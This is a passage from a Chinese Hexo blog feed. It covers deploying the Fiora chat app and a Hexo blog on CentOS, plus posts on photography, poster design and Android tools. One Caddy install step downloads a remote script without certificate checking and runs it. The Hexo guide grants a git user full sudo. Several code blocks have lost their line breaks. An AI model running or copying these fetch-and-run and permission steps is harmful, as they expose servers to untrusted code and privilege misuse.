https://github.com/yinxin630/fiora.git -b master /opt/fioracd /opt/fiora#安装依赖，这里不能用npm，需要用yarn来安装npm i -g yarnyarn#构建npm run build:client#转移产物npm run move-dist#启动npm start</code></pre><p>运行后打开ip:9200，注册一个账号，然后可以看SSH客户端运行日志，获取自己的userId。</p><hr><pre><code>#这里注册或登录的时候返回的信息，后面的5d329dd354b9则为自己的userId&lt;-- getLinkmansLastMessages  mYNheu93jds7 5d329dd354b9</code></pre><p>如果ip:9200打不开的，可以检查下防火墙，可以使用以下命令：</p><hr><pre><code>firewall-cmd --zone=public --add-port=9200/tcp --permanentfirewall-cmd --reload</code></pre><p>注意: 像阿里云等，还需要额外在安全组开放端口。<br>接下来再将自己的账号设置成管理员，先使用Ctrl+C断开运行。<br>新建Systemd配置文件：</p><hr><pre><code>#先修改你的userId和运行端口后复制到SSH运行Administrator=5d329dd354b9Port=9200#新建fiora用户并授权useradd -M fiora &amp;&amp; usermod -L fiorachown -R fiora:fiora /opt/fiora#新建systemd配置文件，将以下代码一起复制到SSH运行cat &gt; /etc/systemd/system/fiora.service &lt;&lt;EOF[Unit]Description=fioraAfter=network.targetWants=network.target[Service]Type=simplePIDFile=/var/run/fiora.pidExecStart=$(command -v npm) startWorkingDirectory=/opt/fioraEnvironment=Administrator=$Administrator Port=$PortUser=fioraRestart=on-failureRestartSec=42s[Install]WantedBy=multi-user.targetEOF</code></pre><p>开始启动并设置开机自启：</p><hr><pre><code>systemctl start fiorasystemctl enable fiora</code></pre><p>管理员userId和运行端口自行修改。</p><hr><pre><code>export Administrator=5d329dd354b9 Port=9200nohup npm start &amp;</code></pre><p>此时就可以访问ip:9200，运行端口以你设置的为准，这时候你登陆的时候，会发现左侧多了个管理员图标。</p><h2 id="五、域名反代"><a href="#五、域名反代" class="headerlink" title="五、域名反代"></a>五、域名反代</h2><p>如果你想使用域名的话，这里使用Caddy反代。<br>安装Caddy：</p><hr><pre><code>wget -N --no-check-certificate https://raw.githubusercontent.com/iiiiiii1/doubi/master/caddy_install.sh &amp;&amp; chmod +x caddy_install.sh &amp;&amp; bash caddy_install.sh#备用地址wget -N --no-check-certificate https://www.moerats.com/usr/shell/Caddy/caddy_install.sh &amp;&amp; chmod +x caddy_install.sh &amp;&amp; bash caddy_install.sh</code></pre><p>配置Caddy：</p><hr><pre><code>#以下全部内容是一个整体，请修改域名后一起复制到SSH运行！#http访问，该配置不会自动签发SSLecho &quot;www.moerats.com {gzipproxy / 127.0.0.1:9200 {websocketheader_upstream Host {host}header_upstream X-Real-IP {remote}header_upstream X-Forwarded-For {remote}header_upstream X-Forwarded-Port {server_port}header_upstream X-Forwarded-Proto {scheme}}}&quot; &gt; /usr/local/caddy/Caddyfile#https访问，该配置会自动签发SSL，请提前解析域名到VPS服务器echo &quot;www.moerats.com {gziptls admin@moerats.comproxy / 127.0.0.1:9200 {websocketheader_upstream Host {host}header_upstream X-Real-IP {remote}header_upstream X-Forwarded-For {remote}header_upstream X-Forwarded-Port {server_port}header_upstream X-Forwarded-Proto {scheme}}}&quot; &gt; /usr/local/caddy/Caddyfile</code></pre><p>启动Caddy：</p><hr><pre><code>/etc/init.d/caddy start</code></pre><p>就可以打开域名进行访问了。<br>注意事项: 一个ip一天只能注册一个账号，还有上传不了图片请自行查看日志。<br>查看日志命令：</p><hr><pre><code>pm2 logs fiora</code></pre><p>其它的就自己慢慢摸索吧，博主也没过多使用，有问题可以直接去Github Issues反馈。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 搭建环境 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>把hexo博客部署到服务器</title>
      <link href="/2020/12/22/11/"/>
      <url>/2020/12/22/11/</url>
      
        <content type="html"><![CDATA[<p>使用的系统是Linux Centos7.6<br>环境 git nginx</p><hr><h1 id="git安装与配置"><a href="#git安装与配置" class="headerlink" title="git安装与配置"></a>git安装与配置</h1><h2 id="1-安装依赖库和编译工具"><a href="#1-安装依赖库和编译工具" class="headerlink" title="1. 安装依赖库和编译工具"></a>1. 安装依赖库和编译工具</h2><hr><pre><code> yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel</code></pre><hr><pre><code>  Is this ok [y/d/N]:  </code></pre><p>输入y继续安装，后面也是。</p><h2 id="2-安装编译工具："><a href="#2-安装编译工具：" class="headerlink" title="2. 安装编译工具："></a>2. 安装编译工具：</h2><hr><pre><code>  yum install gcc perl-ExtUtils-MakeMaker package </code></pre><h1 id="下载-git并解压编译安装"><a href="#下载-git并解压编译安装" class="headerlink" title="下载 git并解压编译安装"></a>下载 git并解压编译安装</h1><h2 id="1-查看服务器已有的git版本"><a href="#1-查看服务器已有的git版本" class="headerlink" title="1. 查看服务器已有的git版本"></a>1. 查看服务器已有的git版本</h2><hr><pre><code>git --version</code></pre><hr><pre><code>git version 1.8.3.1</code></pre><h2 id="2-将陈旧版本的git删除"><a href="#2-将陈旧版本的git删除" class="headerlink" title="2. 将陈旧版本的git删除"></a>2. 将陈旧版本的git删除</h2><hr><pre><code>yum remove git </code></pre><h2 id="3-选择一个目录来存放下载下来的-git-安装包。我这里选择了-usr-local-src-目录"><a href="#3-选择一个目录来存放下载下来的-git-安装包。我这里选择了-usr-local-src-目录" class="headerlink" title="3.选择一个目录来存放下载下来的 git 安装包。我这里选择了/usr/local/src 目录"></a>3.选择一个目录来存放下载下来的 git 安装包。我这里选择了/usr/local/src 目录</h2><hr><pre><code>cd /usr/local/src   </code></pre><h2 id="4-下载最新版git到-usr-local-src，目前最新版本是2-26-0。"><a href="#4-下载最新版git到-usr-local-src，目前最新版本是2-26-0。" class="headerlink" title="4. 下载最新版git到/usr/local/src，目前最新版本是2.26.0。"></a>4. 下载最新版git到/usr/local/src，目前最新版本是2.26.0。</h2><hr><pre><code>wget http://ftp.ntu.edu.tw/software/scm/git/git-2.26.0.tar.gz  </code></pre><h2 id="5-解压到当前目录"><a href="#5-解压到当前目录" class="headerlink" title="5. 解压到当前目录"></a>5. 解压到当前目录</h2><hr><pre><code>tar -zvxf git-2.26.0.tar.gz </code></pre><h2 id="6-进入-git-2-26-0-tar-gz-目录下"><a href="#6-进入-git-2-26-0-tar-gz-目录下" class="headerlink" title="6. 进入 git-2.26.0.tar.gz 目录下"></a>6. 进入 git-2.26.0.tar.gz 目录下</h2><hr><pre><code>cd git-2.26.0</code></pre><h2 id="7-执行编译"><a href="#7-执行编译" class="headerlink" title="7. 执行编译"></a>7. 执行编译</h2><hr><pre><code>make prefix=/usr/local/git all  </code></pre><p>有点慢，耐心等待，去喝口水。</p><h2 id="8-安装-git-到-usr-local-git-目录下"><a href="#8-安装-git-到-usr-local-git-目录下" class="headerlink" title="8.安装 git 到 /usr/local/git 目录下"></a>8.安装 git 到 /usr/local/git 目录下</h2><hr><pre><code>make prefix=/usr/local/git install  </code></pre><h1 id="配置-git-环境变量"><a href="#配置-git-环境变量" class="headerlink" title="配置 git 环境变量"></a>配置 git 环境变量</h1><h2 id="1-打开环境变量配置文件"><a href="#1-打开环境变量配置文件" class="headerlink" title="1.打开环境变量配置文件"></a>1.打开环境变量配置文件</h2><hr><pre><code>vim /etc/profile  </code></pre><p>按i键进入编辑模式，按向下键到底部，添加如下命令：</p><hr><pre><code>PATH=$PATH:/usr/local/git/bin   # git 的目录export PATH  </code></pre><p>添加完毕按esc退出，输入:wq保存编辑。(注意是先:再是wq)后面一样</p><h2 id="2-使-git-环境变量生效"><a href="#2-使-git-环境变量生效" class="headerlink" title="2.使 git 环境变量生效"></a>2.使 git 环境变量生效</h2><hr><pre><code>source /etc/profile</code></pre><h2 id="3-验证安装完成，查看-git-的版本号"><a href="#3-验证安装完成，查看-git-的版本号" class="headerlink" title="3.验证安装完成，查看 git 的版本号"></a>3.验证安装完成，查看 git 的版本号</h2><hr><pre><code>git --version</code></pre><p>git版本已经变成了：</p><hr><pre><code>git version 2.26.01</code></pre><h1 id="创建-git-用户"><a href="#创建-git-用户" class="headerlink" title="创建 git 用户"></a>创建 git 用户</h1><h2 id="1-创建git用户"><a href="#1-创建git用户" class="headerlink" title="1.创建git用户"></a>1.创建git用户</h2><hr><pre><code>adduser git</code></pre><h2 id="2-获取权限"><a href="#2-获取权限" class="headerlink" title="2.获取权限"></a>2.获取权限</h2><hr><pre><code>chmod 740 /etc/sudoersvim /etc/sudoers</code></pre><p>按向下键找到如下字段: </p><hr><pre><code>root    ALL=(ALL)       ALL</code></pre><p>在后面增加如下字段:</p><hr><pre><code>git     ALL=(ALL)       ALL</code></pre><h2 id="3-退回权限"><a href="#3-退回权限" class="headerlink" title="3.退回权限"></a>3.退回权限</h2><hr><pre><code>chmod 400 /etc/sudoers  </code></pre><h1 id="配置密钥"><a href="#配置密钥" class="headerlink" title="配置密钥"></a>配置密钥</h1><h2 id="1-将密钥保存在服务器-之前有密钥的直接复制就可以"><a href="#1-将密钥保存在服务器-之前有密钥的直接复制就可以" class="headerlink" title="1.将密钥保存在服务器(之前有密钥的直接复制就可以)"></a>1.将密钥保存在服务器(之前有密钥的直接复制就可以)</h2><p>将你电脑的id_rsa.pub文件里面的密钥复制,在服务器运行下面命令，创建.ssh文件夹</p><hr><pre><code>su gitmkdir ~/.ssh</code></pre><p>创建.ssh/authorized_keys文件，打开authorized_keys文件并将刚才在本地电脑复制的内容拷贝其中并保存</p><hr><pre><code>vim ~/.ssh/authorized_keys</code></pre><h2 id="2-修改权限"><a href="#2-修改权限" class="headerlink" title="2.修改权限"></a>2.修改权限</h2><hr><pre><code>chmod 755 ~chmod 700 ~/.sshchmod 600 ~/.ssh/authorized_keys</code></pre><h2 id="3-测试本地连接服务器"><a href="#3-测试本地连接服务器" class="headerlink" title="3.测试本地连接服务器"></a>3.测试本地连接服务器</h2><p>在本地电脑打开git bash here</p><hr><pre><code>//yourIp为远程服务器的ip地址ssh -v git@yourIp  </code></pre><p>连接成功显示如下:</p><hr><pre><code>git@vm_0_centos~</code></pre><h1 id="创建git仓库"><a href="#创建git仓库" class="headerlink" title="创建git仓库"></a>创建git仓库</h1><h2 id="1-切换到root用户，创建一个目录用于存储网站的根目录"><a href="#1-切换到root用户，创建一个目录用于存储网站的根目录" class="headerlink" title="1.切换到root用户，创建一个目录用于存储网站的根目录"></a>1.切换到root用户，创建一个目录用于存储网站的根目录</h2><hr><pre><code>su</code></pre><h2 id="2-创建网站的根目录"><a href="#2-创建网站的根目录" class="headerlink" title="2.创建网站的根目录"></a>2.创建网站的根目录</h2><hr><pre><code>mkdir /home/hexo</code></pre><h2 id="3-给予权限"><a href="#3-给予权限" class="headerlink" title="3.给予权限"></a>3.给予权限</h2><hr><pre><code>chown git:git -R /home/hexo</code></pre><h1 id="安装Nginx"><a href="#安装Nginx" class="headerlink" title="安装Nginx"></a>安装Nginx</h1><h2 id="1-安装配置Nginx"><a href="#1-安装配置Nginx" class="headerlink" title="1.安装配置Nginx"></a>1.安装配置Nginx</h2><hr><pre><code>yum install -y nginx</code></pre><p>配置Nginx:</p><hr><pre><code>nginx -t</code></pre><p>使用vim打开nginx.conf文件:</p><hr><pre><code>vim /etc/nginx/nginx.conf</code></pre><p>修改如下信息:</p><hr><pre><code>server {          listen     80 default_server;         listen     [::]:80 default_server;         server_name www.muyiio.com; //你的博客域名         root /home/hexo; //git仓库目录         # Load configuration files for the default server block. include /etc/nginx/default.d/*.conf;         location / {         }         j          error_page 404 /404.html;         location = /40x.html {         }         error_page 500 502 503 504 /50x.html; location = /50x.html { }          }</code></pre><h2 id="2-启动Nginx"><a href="#2-启动Nginx" class="headerlink" title="2.启动Nginx"></a>2.启动Nginx</h2><hr><pre><code>systemctl start nginx.service</code></pre><h2 id="3-重启Nginx"><a href="#3-重启Nginx" class="headerlink" title="3.重启Nginx"></a>3.重启Nginx</h2><hr><pre><code>systemctl restart nginx.service</code></pre><h1 id="自动化部署"><a href="#自动化部署" class="headerlink" title="自动化部署"></a>自动化部署</h1><h2 id="1-登录root账户"><a href="#1-登录root账户" class="headerlink" title="1.登录root账户"></a>1.登录root账户</h2><hr><pre><code>su</code></pre><h2 id="2-建立git仓库"><a href="#2-建立git仓库" class="headerlink" title="2.建立git仓库"></a>2.建立git仓库</h2><hr><pre><code>cd /home/gitgit init --bare blog.git</code></pre><h2 id="3-修改blog-git权限"><a href="#3-修改blog-git权限" class="headerlink" title="3.修改blog.git权限"></a>3.修改blog.git权限</h2><hr><pre><code>chown git:git -R blog.git</code></pre><h2 id="4-在-home-hexo-blog-git-下，有一个自动生成的-hooks-文件夹，创建一个新的-git-钩子-post-receive，用于自动部署。"><a href="#4-在-home-hexo-blog-git-下，有一个自动生成的-hooks-文件夹，创建一个新的-git-钩子-post-receive，用于自动部署。" class="headerlink" title="4.在 /home/hexo/blog.git 下，有一个自动生成的 hooks 文件夹，创建一个新的 git 钩子 post-receive，用于自动部署。"></a>4.在 /home/hexo/blog.git 下，有一个自动生成的 hooks 文件夹，创建一个新的 git 钩子 post-receive，用于自动部署。</h2><hr><pre><code>vim blog.git/hooks/post-receive</code></pre><p>将下边的代码粘贴进去，指定 Git 的工作树（源代码）和 Git 目录:</p><hr><pre><code>git --work-tree=/home/hexo --git-             dir=/home/git/blog.git checkout -f </code></pre><h2 id="5-修改文件权限，使得其可执行。"><a href="#5-修改文件权限，使得其可执行。" class="headerlink" title="5.修改文件权限，使得其可执行。"></a>5.修改文件权限，使得其可执行。</h2><hr><pre><code>chmod +x /home/git/blog.git/hooks/post-receive</code></pre><h1 id="修改本地hexo根目录配置文件"><a href="#修改本地hexo根目录配置文件" class="headerlink" title="修改本地hexo根目录配置文件"></a>修改本地hexo根目录配置文件</h1><h2 id="1-博客根目录-config下增加"><a href="#1-博客根目录-config下增加" class="headerlink" title="1.博客根目录_config下增加"></a>1.博客根目录_config下增加</h2><hr><pre><code>- type: git  repo: root@***(服务器ip,内网外网都行):/home/git/blog.git    #仓库地址  branch: master    #分支</code></pre><h2 id="2-部署"><a href="#2-部署" class="headerlink" title="2.部署"></a>2.部署</h2><hr><pre><code> hexo clean&amp;hexo g&amp;hexo d</code></pre><p> 输入hexo d的时候，一会儿会要求你输入自己的服务器密码，输入密码不会有显示，输完回车就可以。</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>如果出现bash: git-receive-pack: command not found,则到服务器运行：</p><hr><pre><code>sudo ln -s /usr/local/git/bin/git-receive-pack  /usr/bin/git-receive-pack</code></pre><p>根目录配置文件最好使用上面的格式。</p>]]></content>
      
      
      <categories>
          
          <category> hexo Matery </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 搭建环境 </tag>
            
            <tag> Linux </tag>
            
            <tag> hexo Matery </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>摄影不凡 转瞬即逝的2020年</title>
      <link href="/2020/11/29/10/"/>
      <url>/2020/11/29/10/</url>
      
        <content type="html"><![CDATA[<h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>怀念曾经拿着相机穿梭在尼泊尔街头巷尾拍摄人文风情的时光，遇到心动的瞬间按下快门那一刻好像时间可以为你而静止。</p><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>我还不知道你会和北斗七星在充满气辉的荒漠中升起，<br>也不知道在举步艰难的细软沙土中，<br>罕见的夜光云伴着金边的峨眉月，<br>一幕鲸飞于天的场景会在黎明的天空出现。</p><h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p>峡湾之巅风起云涌，峡湾之下冰冷的海水放肆侵蚀。<br>漫长的冬季来临时，<br>太阳在地平线上徘徊，<br>黑夜中寒冷和孤寂似乎被放大了。<br>明天车窗外的阳光可能不再升起，<br>但我依然在这等待一束光，<br>等一束特别的光，点亮这片夜空… </p><h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p>我们生活在同一个星球上，<br>在突如其来的疫情面前，<br>都同样渺小。<br>但总有人用自己的力量保护着，<br>无论何国，无论何地。<br>山川异域，风月同天，<br>岂曰无衣，与子同袍。</p><h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p>我们相信，<br>明媚的阳光终会照亮这片土地，<br>樱花会再次盛开，<br>过早的人们依旧吃着热干面，<br>街道会再次人声鼎沸。<br>我们会摘下口罩，<br>一如既往，<br>去自己想去的地方 见想见的人。</p><h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><p>所有现在发生的一切，都会成为往事。<br>那些瞬间会定格在老照片里，<br>我们会走向人生新的阶段。<br>但是现在，这些瞬间还未过去，<br>它们正在发生，就在当下。<br>所有人都是被参与者，<br>有的人是一场悲剧的主角，有的人是旁观者。<br>他们有过失望，又重新充满希望。<br>在同一片土地上的这群人民，<br>依旧充满着生命力，<br>他们依旧会欣赏灯光璀璨的夜色，<br>享受食物的香气，找寻生活的乐趣。<br>未来有着无限的美好，<br>还有无数值得去爱和被爱的人。<br>人生无限。</p><hr><p><a href="https://mp.weixin.qq.com/s/gYAlQnd0-NH9tBTPCefB9A" target="_blank" rel="noopener">观看成片点我</a></p>]]></content>
      
      
      <categories>
          
          <category> 摄影 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 摄影 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3D轮播图源码</title>
      <link href="/2020/11/28/9/"/>
      <url>/2020/11/28/9/</url>
      
        <content type="html"><![CDATA[<h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p> <a href="https://xiaok.lanzoux.com/icdb05g" target="_blank" rel="noopener">源码链接</a></p>]]></content>
      
      
      <categories>
          
          <category> 资源分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 资源分享 </tag>
            
            <tag> 源码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>海报设计</title>
      <link href="/2020/11/01/8/"/>
      <url>/2020/11/01/8/</url>
      
        <content type="html"><![CDATA[<h2 id="一、什么是海报、海报的作用是什么？"><a href="#一、什么是海报、海报的作用是什么？" class="headerlink" title="一、什么是海报、海报的作用是什么？"></a>一、什么是海报、海报的作用是什么？</h2><p>海报设计是视觉传达的表现之一，通俗的理解海报是一种信息传递艺术，是一种大众化的宣传工具。</p><hr><h2 id="二、海报的特点"><a href="#二、海报的特点" class="headerlink" title="二、海报的特点"></a>二、海报的特点</h2><p>一搬的海报通常含有通知性，所以主题应该明确显眼、一目了然（如xx比赛、打折等），接着概括出如时间、地点、附注等主要内容以最简洁的语句。海报的插图、布局的美观通常是吸引眼球的很好方法。在实际生活中，有比较抽象的和具体的。</p><hr><h2 id="三、海报的分类"><a href="#三、海报的分类" class="headerlink" title="三、海报的分类"></a>三、海报的分类</h2><p>海报按其应用不同大致可以分为商业海报、文化海报、电影海报和公益海报等，这里对它们以大概的介绍。　　1． 商业海报商业海报是指宣传商品或商业服务的商业广告性海报。商业海报的设计，要恰当地配合产品的格调和受众对象。　　2．文化海报文化海报是指各种社会文娱活动及各类展览的宣传海报。展览的种类很多，不同的展览都有它各自的特点，设计师需要了解展览和活动的内容才能运用恰当的方法表现其内容和风格。　3．电影海报电脑海报是海报的分支，电影海报主要是起到吸引观众注意、刺激电影票房收入的作用，与戏剧海报、文化海报等有几分类似。　4．公益海报社会海报是带有一定思想性的。这类海报具有特定的对公众的教育意义，其海报主题包括各种社会公益、道德的宣传，或政治思想的宣传，弘扬爱心奉献、共同进步的精神等。</p><hr><h2 id="四、海报设计应该注意哪些方面？"><a href="#四、海报设计应该注意哪些方面？" class="headerlink" title="四、海报设计应该注意哪些方面？"></a>四、海报设计应该注意哪些方面？</h2><p>1.海报设计必须有相当的号召力与艺术感染力，要调动形象、色彩、构图、形式感等因素形成强烈的视觉效果；<br>2.它的画面应有较强的视觉中心，应力求新颖、单纯，还必须具有独特地艺术风格和设计特点。<br>五、海报设计的步骤？<br>先分析：1、这张海报的目的？2、目标受众是谁？ 3、他们的接受方式怎么样？ 4、其他同行业类型产品的海报怎么样？ 5、此海报的体现策略？6、创意点？7、表现手法？8、怎么样与产品结合？<br>海报设计的具体要素？<br>1,充分的视觉冲击力,可以通过图像和色彩来实现 2,海报表达的内容精炼,抓住主要诉求点. 3,内容不可过多 4,一般以图片为主,文案为辅 5,主题字体醒目</p><hr><p>[海报欣赏链接]</p><h2 id="https-www-warting-com-gallery-poster"><a href="#https-www-warting-com-gallery-poster" class="headerlink" title="https://www.warting.com/gallery/poster"></a><a href="https://www.warting.com/gallery/poster" target="_blank" rel="noopener">https://www.warting.com/gallery/poster</a></h2>]]></content>
      
      
      <categories>
          
          <category> 设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android的系统介绍</title>
      <link href="/2020/10/01/7/"/>
      <url>/2020/10/01/7/</url>
      
        <content type="html"><![CDATA[<h2 id="1-1-系统介绍"><a href="#1-1-系统介绍" class="headerlink" title="1.1 系统介绍"></a>1.1 系统介绍</h2><p>Android 是 Google 开发的基于 Linux 平台的、开源的、智能手机操作系统。Android 包括操作系统、中间<br>件和应用程序，由于源代码开放，Android 可以被移植到不同的硬件平台上。OHA（Open Handset Alliance，开放手机联盟)，为 Google 与 33 家公司联手为 Android 移动平台系统的发<br>展而组建的一个组织。<br>HTC 和 Google 合作推出了几款手机：G1、G2、Hero 和 Nexus One，其他的手机厂商也推出了几款 Android围绕在 Google 的 Android 系统中，形成了移植开发和上层应用程序开发两个不同的开发方面。手机厂商从事移植开发工作，上层的应用程序开发可以由任何单位和个人完成，开发的过程可以基于真实的硬件系统，还可以基于仿真器环境。<br>作为一个手机平台，Android 在技术上的优势主要有以下几点：<br>1 全开放智能手机平台</p><p>2 多硬件平台的支持</p><p>3 使用众多的标准化技术</p><p>4 核心技术完整，统一</p><p>5 完善的 SDK 和文档</p><p>6 完善的辅助开发工具</p><p>Android 的开发者可以在完备的开发环境中进行开发，Android 的官方网站也提供了丰富的文档、资料。这样有利于 Android 系统的开发和运行在一个良好的生态环境中。</p><hr><h2 id="1-2-软件结构和使用的工具"><a href="#1-2-软件结构和使用的工具" class="headerlink" title="1.2 软件结构和使用的工具"></a>1.2 软件结构和使用的工具</h2><p>从宏观的角度来看，Android 是一个开放的软件系统，它包含了众多的源代码。从下至上，Android 系统分<br>成 4 个层次：</p><p> 第 1 层次：Linux 操作系统及驱动；</p><p> 第 2 层次：本地代码（C/C++）框架；</p><p> 第 3 层次：Java 框架；</p><p> 第 4 层次：Java 应用程序。<br> Android 的第 1 层次由 C 语言实现，第 2 层次由 C 和/C++实现，第 3、4 层次主要由 Java 代码实现。<br>第 1 层次和第 2 层次之间，从 Linux 操作系统的角度来来看，是内核空间与用户空间的分界线，第 1 层次<br>运行于内核空间，第 2、3、4 层次运行于用户空间。<br>第 2 层次和第 3 层次之间，是本地代码层和 Java 代码层的接口。<br>第 3 层次和第 4 层次之间，是 Android 的系统 API 的接口，对于 Android 应用程序的开发，第 3 层次以下<br>的内容是不可见的，仅考虑系统 API 即可。<br>由于 Android 系统需要支持 Java 代码的运行，这部分内容是 Android 的运行环境（Runtime），由虚拟机和<br>Java 基本类组成。<br>对于 Android 应用程序的开发，主要关注第 3 层次和第 4 层次之间的接口。除了软件本身的代码之外，Android 还提供了一系列工具来辅助系统开发，这些主要的工具包括：<br> aapt（Android Asset Packaging Tool）：用于建立 zip 兼容的包（zip、jar、apk），也可用于将资源编译到二进<br>制的 assets。<br> adb（Android Debug Bridge，Android 调试桥）：使用 adb 工具可以在模拟器或设备上安装应用程序的.apk文件，并从命令行访问模拟器或设备。也可以用它把 Android 模拟器或设备上的应用程序代码和一个标准<br>的调试器连接在一起。<br> android 工具：android 工具是一个脚本，用于创建和管理 Android Virtual Devices （AVDs）。<br> AIDL 工具（Android Interface Description Language，Android 接口描述语言工具），AIDL 工具可以生成进程间接口的代码，诸如 Service 可能使用的接口。<br> AVDs（Android Virtual Devices，Android 虚拟设备）<br> 用于配置模拟器，模拟出类似的设备效果<br> DDMS（Dalvik Debug Monitor Service，Dalvik 调试监视器服务）：这个工具集成了 Dalvik，能够在模拟器<br>或者设备上管理进程并协助调试。可以使用它杀死进程，选择某个特定的进程来调试，产生跟踪数据，观察堆（heap）和线程信息，截取模拟器或设备的屏幕画面，还有更多的功能。<br> dx：dx 工具用于将.class 字节码（bytecode）转换为 Android 字节码（保存在.dex 文件中）这个字节码文件<br>是给 Android 的 Java 虚拟机运行用的。<br> Draw 9-patch：Draw 9-patch 工具允许使用所见即所得（WYSIWYG）的编辑器轻松地创建 NinePatch 图形。<br> Emulator（模拟器）：模拟器是一个运行于主机上的程序，可以使用模拟器来模拟一个实际的 Android 系统<br>的运行，使用模拟器非常适合调试和测试应用程序。<br> Hierarchy Viewer（层级观察器）：层级观察器工具允许调试和优化用户界面。它用可视的方法把视图（view）<br>的布局层次展现出来，此外，还给当前界面提供了一个具有像素栅格（grid）的放大镜观察器。<br> mksdcard：帮助创建磁盘映像（disk image），可以在模拟器环境下使用磁盘映像来模拟外部存储卡（例如<br>SD 卡）。<br> Monkey：Monkey 是在模拟器或设备上运行的一个小程序，它能够产生随机的用户事件流，例如：点击（click）、触摸（touch）、挥手（gestures），还包括一系列系统级事件。可以使用 Monkey 给正在开发的程序做随机的但可重复的压力测试。<br> sqlite3：sqlite3 工具能够方便地访问 SQLite 数据文件，这是一个 sqlite 标准命令行工具。<br> Traceview：这个工具可以将 Android 应用程序产生的跟踪日志（trace log）转换为图形化的分析视图。</p>]]></content>
      
      
      <categories>
          
          <category> 手机系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>八个容易忽视的风光摄影技巧</title>
      <link href="/2020/09/01/6/"/>
      <url>/2020/09/01/6/</url>
      
        <content type="html"><![CDATA[<h2 id="一、该拍什么"><a href="#一、该拍什么" class="headerlink" title="一、该拍什么"></a>一、该拍什么</h2><p>该拍什么?可能有人会说：见什么就拍什么呗!其实，能否拍出精彩的风光照片，事先必须要有好的构思。首先，我们应该观察眼前风光的特征，为什么它会令人着迷?为什么值得一拍?想想这幅精致会带给你什么样的心理感受?是辽阔的草原、荒凉的沙漠、茂盛的森林、还是雄伟的山峰。然后，仔细研究眼前的风光，看看那些元素可以用镜头来凸现，以传达心中的感受。比如该用什么长度的镜头、该在什么时候拍摄、该把那些元素放入画面。假设是在大海边，为了表现大海的深邃，(如图1)可以把海平线放在画面的四分之一以下，突出天空中浓重的云彩，并且在曝光上压暗画面的亮度，以传达辽阔与孤独之感。</p><h2 id="二、清晰度的获得"><a href="#二、清晰度的获得" class="headerlink" title="二、清晰度的获得"></a>二、清晰度的获得</h2><p>风光摄影最基本的技术要求是拍出清晰的大自然影像。但是，如何获得清晰的风光照片却不那么容易，这须要有较为扎实的摄影基本功。进行风光摄影，就必须深刻理解景深的概念。我们知道，每个镜头都是有景深的，在大光圈下，景深小；在小光圈下，景深大。风光摄影大师亚当斯的许多照片都是用F64的小光圈来拍摄的，这样能够获得从前景到远景都清晰的大景深照片。所以我们在拍摄风光照片时，通常应该用尽量小的光圈，这样能够获得最大的景深，而且对焦点必须控制在景深范围的中间略靠前位置。不要只对准前景或远景来聚焦，否则就不能够获得足够的清晰度。由于，风光照片不需要抓拍，所以可以多用手动对焦，以期获得更准确的对焦效果。但是，如果你用了小光圈，就必须用慢速快门，所以在光照不够强的情况下很可能会动，使画面发虚，而提高感光度来拍摄又会使画面产生躁点，这时你就必须使用三脚架。所以三脚架是风光摄影师的必备。另外，根据笔者的经验，要想使你的风光照片获得最饱和的色彩再现，应该在多云或者天空较亮的阴天拍摄，而不是在阳光耀眼的时候去拍摄。过强的阳光会使景物的反差太大，层次损失较多，不利于再现色彩。</p><h2 id="三、小景也精彩"><a href="#三、小景也精彩" class="headerlink" title="三、小景也精彩"></a>三、小景也精彩</h2><p>大家可能总是喜欢拍摄气势磅礴的照片，要知道精致的小景，如路边的一株生机勃勃的小草，也可以拍得很精彩。其实在大景观中的一些细节，非常的动人，拥有很美的画面，很让人喜欢。小景照片可以在野外的各个角落找到，只要你有一双发现的眼睛。在你拍完眼前的大风光照片时，是否能够留意一下身边的一花一草，去细心观察每一个大自然造就的奇迹。而你拍的这些小景照片很有可能是世上独一无二的 ，因为没有人能够重复。</p><h2 id="四、时间与天气的重要性"><a href="#四、时间与天气的重要性" class="headerlink" title="四、时间与天气的重要性"></a>四、时间与天气的重要性</h2><p>职业摄影师总是喜欢不同寻常的天气，运用云、雨、雪、雾等气候特征来增强照片的气氛，从而传达出风光作品的不同心理感受，我们常说风光摄影师是靠天吃饭的。不同的天气可以使同一个 获得不同的视觉特征，运用好天气是你的风光作品与众不同的好办法。比如，天空中的云彩是一个改变风光照片画面效果的好帮手，白云朵朵会使风光照显得清新透亮，霞光异彩会使风光照变得光彩动人，浓云低沉却会使风光照充满神秘感。应该想方设法选择富有魅力的天气状况，才出去拍摄你的风光作品。</p><h2 id="五、构图是灵魂"><a href="#五、构图是灵魂" class="headerlink" title="五、构图是灵魂"></a>五、构图是灵魂</h2><p>构图对于风光照片具有举足轻重的作用，每一张照片都必须为构图而费心。大胆构图是我们常挂在嘴边的话，但是要做到这一点也并不容易，这要求你经常尝试新的构图形式。构图新颖的照片常常会给人眼睛一亮的感觉。在拍摄开阔的场景时，应该注意画面中具有艺术感的元素，并用镜头来强调它。例如韵律重复的物体或图案、有力的对角线、强烈的颜色对比、丰富的肌理、或者富有美感的图案。而拍摄精致的小景时，构图也极为重要，应该想各种办法突出主体。平时多研究一些古典 